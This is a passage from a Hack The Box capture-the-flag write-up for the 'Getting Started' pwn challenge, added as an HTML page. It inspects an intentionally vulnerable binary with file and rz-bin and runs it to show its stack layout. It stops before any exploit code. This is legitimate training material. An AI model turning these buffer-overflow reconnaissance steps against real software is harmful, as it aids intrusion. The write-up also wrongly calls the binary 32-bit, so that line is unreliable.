@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is a very easy Pwn challenge.">
+    
+    <title>
+        
+            Getting Started | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Getting Started<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-31</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.svg"
+                src="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/cover.svg"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#identification">Identification</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#libraries">Libraries</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#imports">Imports</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#symbols">Symbols</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#strings">Strings</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#execution">Execution</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#exploit">Exploit</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#local">Local</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#remote">Remote</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/getting-started/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Very easy</p>
+<p><strong>Category</strong>: Pwn</p>
+<p><strong>Release date</strong>: 2023-04-14</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/70668">w3th4nds</a></p>
+<p><strong>Description</strong>: Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.</p>
+<h1 id="setup">Setup</h1>
+<p>I'll complete this challenge using a Linux VM. I'll create a <code>workspace</code> directory at <code>/</code> to hold all the files related to this challenge.</p>
+<p>Throughout this write-up, the target machine's IP address will be <code>188.166.175.58</code>, and the port will be <code>31551</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity.</p>
+<h1 id="identification">Identification</h1>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace
+</span><span class="z-text z-plain">├── flag.txt
+</span><span class="z-text z-plain">├── glibc
+</span><span class="z-text z-plain">│   ├── ld-linux-x86-64.so.2
+</span><span class="z-text z-plain">│   └── libc.so.6
+</span><span class="z-text z-plain">├── gs
+</span><span class="z-text z-plain">└── wrapper.py
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The challenge is comprised of several files. The most interesting are <code>flag.txt</code>, which contains a test string, the <code>wrapper.py</code>, which contains a base for the exploit development phase that we'll have to build upon, and the <code>gs</code> binary. It's probably meant to be run pn Linux, but let's confirm this by running <code>file</code> on it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> file /workspace/gs</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace/gs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=505eb225ba13a677aa5f00d5e3d840f63237871f, for GNU/Linux 3.2.0, not stripped
+</span></code></pre>
+<p>Okay, so it looks like this is an ELF 32-bit, LSB executable.</p>
+<p>Let's find more information about it using <code>zn-bin</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rz-bin<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span> /workspace/gs</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[Info]
+</span><span class="z-text z-plain">arch     x86
+</span><span class="z-text z-plain">cpu      N/A
+</span><span class="z-text z-plain">baddr    0x00000000
+</span><span class="z-text z-plain">binsz    0x00003bf1
+</span><span class="z-text z-plain">bintype  elf
+</span><span class="z-text z-plain">bits     64
+</span><span class="z-text z-plain">class    ELF64
+</span><span class="z-text z-plain">compiler GCC: (Debian 10.2.1-6) 10.2.1 20210110
+</span><span class="z-text z-plain">dbg_file N/A
+</span><span class="z-text z-plain">endian   LE
+</span><span class="z-text z-plain">hdr.csum N/A
+</span><span class="z-text z-plain">guid     N/A
+</span><span class="z-text z-plain">intrp    ./glibc/ld-linux-x86-64.so.2
+</span><span class="z-text z-plain">laddr    0x00000000
+</span><span class="z-text z-plain">lang     c
+</span><span class="z-text z-plain">machine  AMD x86-64 architecture
+</span><span class="z-text z-plain">maxopsz  16
+</span><span class="z-text z-plain">minopsz  1
+</span><span class="z-text z-plain">os       linux
+</span><span class="z-text z-plain">cc       N/A
+</span><span class="z-text z-plain">pcalign  0
+</span><span class="z-text z-plain">relro    full
+</span><span class="z-text z-plain">rpath    ./glibc/
+</span><span class="z-text z-plain">subsys   linux
+</span><span class="z-text z-plain">stripped false
+</span><span class="z-text z-plain">crypto   false
+</span><span class="z-text z-plain">havecode true
+</span><span class="z-text z-plain">va       true
+</span><span class="z-text z-plain">sanitiz  false
+</span><span class="z-text z-plain">static   false
+</span><span class="z-text z-plain">linenum  true
+</span><span class="z-text z-plain">lsyms    true
+</span><span class="z-text z-plain">canary   false
+</span><span class="z-text z-plain">PIE      true
+</span><span class="z-text z-plain">RELROCS  true
+</span><span class="z-text z-plain">NX       true
+</span></code></pre>
+<p>This confirms the information we got with <code>file</code>.</p>
+<p>We notice that there are a few protections in place. Let's hope that it won't be too troublesome when it gets to the actual exploitation of the binary.</p>
+<h1 id="libraries">Libraries</h1>
+<p>Let's find the list of libraries used by this binary.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rz-bin<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span> /workspace/gs</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[Libs]
+</span><span class="z-text z-plain">library   
+</span><span class="z-text z-plain">----------
+</span><span class="z-text z-plain">libc.so.6
+</span></code></pre>
+<p>So this binary uses the <code>libc.so.6</code> library, which provides the fundamental functionalities for programs written in C.</p>
+<h1 id="imports">Imports</h1>
+<p>Now, let's find the list of imports used by this binary.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rz-bin<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> /workspace/gs</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[Imports]
+</span><span class="z-text z-plain">nth vaddr      bind   type   lib name                        
+</span><span class="z-text z-plain">-------------------------------------------------------------
+</span><span class="z-text z-plain">1   0x00001030 GLOBAL FUNC       putchar
+</span><span class="z-text z-plain">2   ---------- WEAK   NOTYPE     _ITM_deregisterTMCloneTable
+</span><span class="z-text z-plain">3   0x00001040 GLOBAL FUNC       puts
+</span><span class="z-text z-plain">4   0x00001050 GLOBAL FUNC       strlen
+</span><span class="z-text z-plain">5   0x00001060 GLOBAL FUNC       printf
+</span><span class="z-text z-plain">6   0x00001070 GLOBAL FUNC       alarm
+</span><span class="z-text z-plain">7   0x00001080 GLOBAL FUNC       close
+</span><span class="z-text z-plain">8   0x00001090 GLOBAL FUNC       fputc
+</span><span class="z-text z-plain">9   0x000010a0 GLOBAL FUNC       read
+</span><span class="z-text z-plain">10  ---------- GLOBAL FUNC       __libc_start_main
+</span><span class="z-text z-plain">11  ---------- WEAK   NOTYPE     __gmon_start__
+</span><span class="z-text z-plain">12  0x000010b0 GLOBAL FUNC       setvbuf
+</span><span class="z-text z-plain">13  0x000010c0 GLOBAL FUNC       open
+</span><span class="z-text z-plain">14  0x000010d0 GLOBAL FUNC       perror
+</span><span class="z-text z-plain">15  0x000010e0 GLOBAL FUNC       __isoc99_scanf
+</span><span class="z-text z-plain">16  0x000010f0 GLOBAL FUNC       exit
+</span><span class="z-text z-plain">17  ---------- WEAK   NOTYPE     _ITM_registerTMCloneTable
+</span><span class="z-text z-plain">19  0x00001100 WEAK   FUNC       __cxa_finalize
+</span></code></pre>
+<p>So this binary imports functions like <code>putchar</code> and <code>strlen</code> to work with strings, but also <code>open</code>, <code>read</code> and <code>close</code> to work with files. The <code>printf</code> function is likely used to print text to the terminal.</p>
+<h1 id="symbols">Symbols</h1>
+<p>Let's find the list of symbols for this binary.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rz-bin<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span> /workspace/gs</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[Symbols]
+</span><span class="z-text z-plain">nth paddr      vaddr      bind   type   size lib name                                   
+</span><span class="z-text z-plain">----------------------------------------------------------------------------------------
+</span><span class="z-text z-plain">18  ---------- 0x00004010 GLOBAL OBJ    8        stdout
+</span><span class="z-text z-plain">20  ---------- 0x00004020 GLOBAL OBJ    8        stdin
+</span><span class="z-text z-plain">1   0x000002a8 0x000002a8 LOCAL  SECT   0        .interp
+</span><span class="z-text z-plain">2   0x000002c8 0x000002c8 LOCAL  SECT   0        .note.gnu.build-id
+</span><span class="z-text z-plain">3   0x000002ec 0x000002ec LOCAL  SECT   0        .note.ABI-tag
+</span><span class="z-text z-plain">4   0x00000310 0x00000310 LOCAL  SECT   0        .gnu.hash
+</span><span class="z-text z-plain">5   0x00000340 0x00000340 LOCAL  SECT   0        .dynsym
+</span><span class="z-text z-plain">6   0x00000538 0x00000538 LOCAL  SECT   0        .dynstr
+</span><span class="z-text z-plain">7   0x00000630 0x00000630 LOCAL  SECT   0        .gnu.version
+</span><span class="z-text z-plain">8   0x00000660 0x00000660 LOCAL  SECT   0        .gnu.version_r
+</span><span class="z-text z-plain">9   0x00000690 0x00000690 LOCAL  SECT   0        .rela.dyn
+</span><span class="z-text z-plain">10  0x00000780 0x00000780 LOCAL  SECT   0        .rela.plt
+</span><span class="z-text z-plain">11  0x00001000 0x00001000 LOCAL  SECT   0        .init
+</span><span class="z-text z-plain">12  0x00001020 0x00001020 LOCAL  SECT   0        .plt
+</span><span class="z-text z-plain">13  0x00001100 0x00001100 LOCAL  SECT   0        .plt.got
+</span><span class="z-text z-plain">14  0x00001110 0x00001110 LOCAL  SECT   0        .text
+</span><span class="z-text z-plain">15  0x00001864 0x00001864 LOCAL  SECT   0        .fini
+</span><span class="z-text z-plain">16  0x00002000 0x00002000 LOCAL  SECT   0        .rodata
+</span><span class="z-text z-plain">17  0x000026fc 0x000026fc LOCAL  SECT   0        .eh_frame_hdr
+</span><span class="z-text z-plain">18  0x00002758 0x00002758 LOCAL  SECT   0        .eh_frame
+</span><span class="z-text z-plain">19  0x00002d48 0x00003d48 LOCAL  SECT   0        .init_array
+</span><span class="z-text z-plain">20  0x00002d50 0x00003d50 LOCAL  SECT   0        .fini_array
+</span><span class="z-text z-plain">21  0x00002d58 0x00003d58 LOCAL  SECT   0        .dynamic
+</span><span class="z-text z-plain">22  0x00002f58 0x00003f58 LOCAL  SECT   0        .got
+</span><span class="z-text z-plain">23  0x00003000 0x00004000 LOCAL  SECT   0        .data
+</span><span class="z-text z-plain">24  ---------- 0x00004010 LOCAL  SECT   0        .bss
+</span><span class="z-text z-plain">25  0x00000000 0x00000000 LOCAL  SECT   0        .comment
+</span><span class="z-text z-plain">26  0x00000000 0x00000000 LOCAL  FILE   0        crtstuff.c
+</span><span class="z-text z-plain">27  0x00001140 0x00001140 LOCAL  FUNC   0        deregister_tm_clones
+</span><span class="z-text z-plain">28  0x00001170 0x00001170 LOCAL  FUNC   0        register_tm_clones
+</span><span class="z-text z-plain">29  0x000011b0 0x000011b0 LOCAL  FUNC   0        __do_global_dtors_aux
+</span><span class="z-text z-plain">30  ---------- 0x00004028 LOCAL  OBJ    1        completed.0
+</span><span class="z-text z-plain">31  0x00002d50 0x00003d50 LOCAL  OBJ    0        __do_global_dtors_aux_fini_array_entry
+</span><span class="z-text z-plain">32  0x000011f0 0x000011f0 LOCAL  FUNC   0        frame_dummy
+</span><span class="z-text z-plain">33  0x00002d48 0x00003d48 LOCAL  OBJ    0        __frame_dummy_init_array_entry
+</span><span class="z-text z-plain">34  0x00000000 0x00000000 LOCAL  FILE   0        gs.c
+</span><span class="z-text z-plain">35  0x00000000 0x00000000 LOCAL  FILE   0        crtstuff.c
+</span><span class="z-text z-plain">36  0x000028dc 0x000028dc LOCAL  OBJ    0        __FRAME_END__
+</span><span class="z-text z-plain">37  0x00000000 0x00000000 LOCAL  FILE   0        
+</span><span class="z-text z-plain">38  0x00002d50 0x00003d50 LOCAL  NOTYPE 0        __init_array_end
+</span><span class="z-text z-plain">39  0x00002d58 0x00003d58 LOCAL  OBJ    0        _DYNAMIC
+</span><span class="z-text z-plain">40  0x00002d48 0x00003d48 LOCAL  NOTYPE 0        __init_array_start
+</span><span class="z-text z-plain">41  0x000026fc 0x000026fc LOCAL  NOTYPE 0        __GNU_EH_FRAME_HDR
+</span><span class="z-text z-plain">42  0x00002f58 0x00003f58 LOCAL  OBJ    0        _GLOBAL_OFFSET_TABLE_
+</span><span class="z-text z-plain">43  0x00001000 0x00001000 LOCAL  FUNC   0        _init
+</span><span class="z-text z-plain">44  0x00001860 0x00001860 GLOBAL FUNC   1        __libc_csu_fini
+</span><span class="z-text z-plain">47  ---------- 0x00004010 GLOBAL OBJ    8        stdout@GLIBC_2.2.5
+</span><span class="z-text z-plain">48  0x00003000 0x00004000 WEAK   NOTYPE 0        data_start
+</span><span class="z-text z-plain">50  ---------- 0x00004020 GLOBAL OBJ    8        stdin@GLIBC_2.2.5
+</span><span class="z-text z-plain">51  ---------- 0x00004010 GLOBAL NOTYPE 0        _edata
+</span><span class="z-text z-plain">52  0x00001864 0x00001864 GLOBAL FUNC   0        _fini
+</span><span class="z-text z-plain">60  0x00003000 0x00004000 GLOBAL NOTYPE 0        __data_start
+</span><span class="z-text z-plain">62  0x00003008 0x00004008 GLOBAL OBJ    0        __dso_handle
+</span><span class="z-text z-plain">63  0x00002000 0x00002000 GLOBAL OBJ    4        _IO_stdin_used
+</span><span class="z-text z-plain">64  0x00001800 0x00001800 GLOBAL FUNC   93       __libc_csu_init
+</span><span class="z-text z-plain">65  0x000013f9 0x000013f9 GLOBAL FUNC   602      show_stack
+</span><span class="z-text z-plain">66  0x000011f5 0x000011f5 GLOBAL FUNC   125      win
+</span><span class="z-text z-plain">67  ---------- 0x00004030 GLOBAL NOTYPE 0        _end
+</span><span class="z-text z-plain">68  0x00001110 0x00001110 GLOBAL FUNC   43       _start
+</span><span class="z-text z-plain">69  ---------- 0x00004010 GLOBAL NOTYPE 0        __bss_start
+</span><span class="z-text z-plain">70  0x000016a0 0x000016a0 GLOBAL FUNC   352      main
+</span><span class="z-text z-plain">76  ---------- 0x00004010 GLOBAL OBJ    0        __TMC_END__
+</span><span class="z-text z-plain">78  0x00001272 0x00001272 GLOBAL FUNC   391      buffer_demo
+</span><span class="z-text z-plain">80  0x00001653 0x00001653 GLOBAL FUNC   77       setup
+</span><span class="z-text z-plain">1   0x00001030 0x00001030 GLOBAL FUNC   16       imp.putchar
+</span><span class="z-text z-plain">2   ---------- ---------- WEAK   NOTYPE 0        imp._ITM_deregisterTMCloneTable
+</span><span class="z-text z-plain">3   0x00001040 0x00001040 GLOBAL FUNC   16       imp.puts
+</span><span class="z-text z-plain">4   0x00001050 0x00001050 GLOBAL FUNC   16       imp.strlen
+</span><span class="z-text z-plain">5   0x00001060 0x00001060 GLOBAL FUNC   16       imp.printf
+</span><span class="z-text z-plain">6   0x00001070 0x00001070 GLOBAL FUNC   16       imp.alarm
+</span><span class="z-text z-plain">7   0x00001080 0x00001080 GLOBAL FUNC   16       imp.close
+</span><span class="z-text z-plain">8   0x00001090 0x00001090 GLOBAL FUNC   16       imp.fputc
+</span><span class="z-text z-plain">9   0x000010a0 0x000010a0 GLOBAL FUNC   16       imp.read
+</span><span class="z-text z-plain">10  ---------- ---------- GLOBAL FUNC   0        imp.__libc_start_main
+</span><span class="z-text z-plain">11  ---------- ---------- WEAK   NOTYPE 0        imp.__gmon_start__
+</span><span class="z-text z-plain">12  0x000010b0 0x000010b0 GLOBAL FUNC   16       imp.setvbuf
+</span><span class="z-text z-plain">13  0x000010c0 0x000010c0 GLOBAL FUNC   16       imp.open
+</span><span class="z-text z-plain">14  0x000010d0 0x000010d0 GLOBAL FUNC   16       imp.perror
+</span><span class="z-text z-plain">15  0x000010e0 0x000010e0 GLOBAL FUNC   16       imp.__isoc99_scanf
+</span><span class="z-text z-plain">16  0x000010f0 0x000010f0 GLOBAL FUNC   16       imp.exit
+</span><span class="z-text z-plain">17  ---------- ---------- WEAK   NOTYPE 0        imp._ITM_registerTMCloneTable
+</span><span class="z-text z-plain">19  0x00001100 0x00001100 WEAK   FUNC   16       imp.__cxa_finalize
+</span></code></pre>
+<p>We notice a <code>gs.c</code> entry, and some of the functions we discovered in the last section.</p>
+<h1 id="strings">Strings</h1>
+<p>Finally, let's retrieve the list of strings contained in this binary.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rz-bin<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>z</span> /workspace/gs</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[Strings]
+</span><span class="z-text z-plain">nth paddr      vaddr      len size section type   string                                                                                                                                                                                                                                                                                                         
+</span><span class="z-text z-plain">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+</span><span class="z-text z-plain">0   0x00002008 0x00002008 10  11   .rodata ascii  ./flag.txt
+</span><span class="z-text z-plain">1   0x00002018 0x00002018 59  60   .rodata ascii  \nError opening flag.txt, please contact an Administrator.\n\n
+</span><span class="z-text z-plain">2   0x00002054 0x00002054 7   8    .rodata ascii  \e[1;34m
+</span><span class="z-text z-plain">3   0x00002060 0x00002060 31  32   .rodata ascii  \e[4mStack frame layout\e[0m%s \n\n
+</span><span class="z-text z-plain">4   0x00002080 0x00002080 35  36   .rodata ascii  |      .      | &lt;- Higher addresses
+</span><span class="z-text z-plain">5   0x000020a4 0x000020a4 15  16   .rodata ascii  |      .      |
+</span><span class="z-text z-plain">6   0x000020b4 0x000020b4 15  16   .rodata ascii  |_____________|
+</span><span class="z-text z-plain">7   0x000020c4 0x000020c4 28  29   .rodata ascii  |             | &lt;- %d bytes\n
+</span><span class="z-text z-plain">8   0x000020e1 0x000020e1 15  16   .rodata ascii  | Return addr |
+</span><span class="z-text z-plain">9   0x000020f1 0x000020f1 15  16   .rodata ascii  |     RBP     |
+</span><span class="z-text z-plain">10  0x00002101 0x00002101 15  16   .rodata ascii  |   target    |
+</span><span class="z-text z-plain">11  0x00002111 0x00002111 15  16   .rodata ascii  |  alignment  |
+</span><span class="z-text z-plain">12  0x00002121 0x00002121 16  17   .rodata ascii  |  Buffer[%d] |\n
+</span><span class="z-text z-plain">13  0x00002132 0x00002132 15  16   .rodata ascii  |             |
+</span><span class="z-text z-plain">14  0x00002142 0x00002142 15  16   .rodata ascii  |  Buffer[0]  |
+</span><span class="z-text z-plain">15  0x00002158 0x00002158 34  35   .rodata ascii  |_____________| &lt;- Lower addresses
+</span><span class="z-text z-plain">16  0x0000217b 0x0000217b 13  14   .rodata ascii        [Value]
+</span><span class="z-text z-plain">17  0x00002189 0x00002189 12  13   .rodata ascii        [Addr]
+</span><span class="z-text z-plain">18  0x00002196 0x00002196 14  15   .rodata ascii  \n\n%-19s|%-20s\n
+</span><span class="z-text z-plain">19  0x000021a8 0x000021a8 39  40   .rodata ascii  -------------------+-------------------
+</span><span class="z-text z-plain">20  0x000021d0 0x000021d0 7   8    .rodata ascii  \e[1;32m
+</span><span class="z-text z-plain">21  0x000021d8 0x000021d8 23  24   .rodata ascii  0x%016lx | %s0x%016lx%s
+</span><span class="z-text z-plain">22  0x000021f0 0x000021f0 24  25   .rodata ascii   &lt;- %sStart of buffer%s\n
+</span><span class="z-text z-plain">23  0x00002209 0x00002209 7   8    .rodata ascii  \e[1;31m
+</span><span class="z-text z-plain">24  0x00002211 0x00002211 25  26   .rodata ascii   &lt;- %sTarget to change%s\n
+</span><span class="z-text z-plain">25  0x0000222b 0x0000222b 19  20   .rodata ascii  0x%016lx | 0x%016lx
+</span><span class="z-text z-plain">26  0x0000223f 0x0000223f 29  30   .rodata ascii   &lt;- Dummy value for alignment
+</span><span class="z-text z-plain">27  0x0000225d 0x0000225d 13  14   .rodata ascii   &lt;- Saved rbp
+</span><span class="z-text z-plain">28  0x0000226b 0x0000226b 24  25   .rodata ascii   &lt;- Saved return address
+</span><span class="z-text z-plain">29  0x00002288 0x00002288 91  92   .rodata ascii  \nAfter we insert 4 &quot;A&quot;s, (the hex representation of A is 0x41), the stack layout like this:
+</span><span class="z-text z-plain">30  0x000022e8 0x000022e8 97  98   .rodata ascii  \nAfter we insert 4 &quot;B&quot;s, (the hex representation of B is 0x42), the stack layout looks like this:
+</span><span class="z-text z-plain">31  0x00002350 0x00002350 301 302  .rodata ibm037 SpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpi\nSpi
+</span><span class="z-text z-plain">32  0x0000247e 0x0000247e 96  97   .rodata utf8                                                                                                   
+</span><span class="z-text z-plain">33  0x000024e5 0x000024e5 97  98   .rodata utf8     Fill the 32-byte buffer, overwrite the alginment address and the &quot;target&#39;s&quot; 0xdeadbeef value.  
+</span><span class="z-text z-plain">34  0x0000254d 0x0000254d 97  98   .rodata utf8                                                                                                    
+</span><span class="z-text z-plain">35  0x000025b1 0x000025b1 105 304  .rodata utf8   \n◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉\n\n&gt;&gt;  blocks=Basic Latin,Geometric Shapes
+</span><span class="z-text z-plain">36  0x000026e4 0x000026e4 20  21   .rodata ascii  \n%s[-] You failed!\n\n
+</span></code></pre>
+<p>There's <code>37</code> strings.</p>
+<p>It looks like a binary purposefully vulnerable to a buffer overflow, the strings guide us to exploit it.</p>
+<h1 id="execution">Execution</h1>
+<p>Let's execute this binary and see how it behaves.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> /workspace/gs</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Stack frame layout 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">|      .      | &lt;- Higher addresses
+</span><span class="z-text z-plain">|      .      |
+</span><span class="z-text z-plain">|_____________|
+</span><span class="z-text z-plain">|             | &lt;- 64 bytes
+</span><span class="z-text z-plain">| Return addr |
+</span><span class="z-text z-plain">|_____________|
+</span><span class="z-text z-plain">|             | &lt;- 56 bytes
+</span><span class="z-text z-plain">|     RBP     |
+</span><span class="z-text z-plain">|_____________|
+</span><span class="z-text z-plain">|             | &lt;- 48 bytes
+</span><span class="z-text z-plain">|   target    |
+</span><span class="z-text z-plain">|_____________|
+</span><span class="z-text z-plain">|             | &lt;- 40 bytes
+</span><span class="z-text z-plain">|  alignment  |
+</span><span class="z-text z-plain">|_____________|
+</span><span class="z-text z-plain">|             | &lt;- 32 bytes
+</span><span class="z-text z-plain">|  Buffer[31] |
+</span><span class="z-text z-plain">|_____________|
+</span><span class="z-text z-plain">|      .      |
+</span><span class="z-text z-plain">|      .      |
+</span><span class="z-text z-plain">|_____________|
+</span><span class="z-text z-plain">|             |
+</span><span class="z-text z-plain">|  Buffer[0]  |
+</span><span class="z-text z-plain">|_____________| &lt;- Lower addresses
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">      [Addr]       |      [Value]       
+</span><span class="z-text z-plain">-------------------+-------------------
+</span><span class="z-text z-plain">0x00007ffc5992bf50 | 0x0000000000000000 &lt;- Start of buffer
+</span><span class="z-text z-plain">0x00007ffc5992bf58 | 0x0000000000000000
+</span><span class="z-text z-plain">0x00007ffc5992bf60 | 0x0000000000000000
+</span><span class="z-text z-plain">0x00007ffc5992bf68 | 0x0000000000000000
+</span><span class="z-text z-plain">0x00007ffc5992bf70 | 0x6969696969696969 &lt;- Dummy value for alignment
+</span><span class="z-text z-plain">0x00007ffc5992bf78 | 0x00000000deadbeef &lt;- Target to change
+</span><span class="z-text z-plain">0x00007ffc5992bf80 | 0x000055a9dcd56800 &lt;- Saved rbp
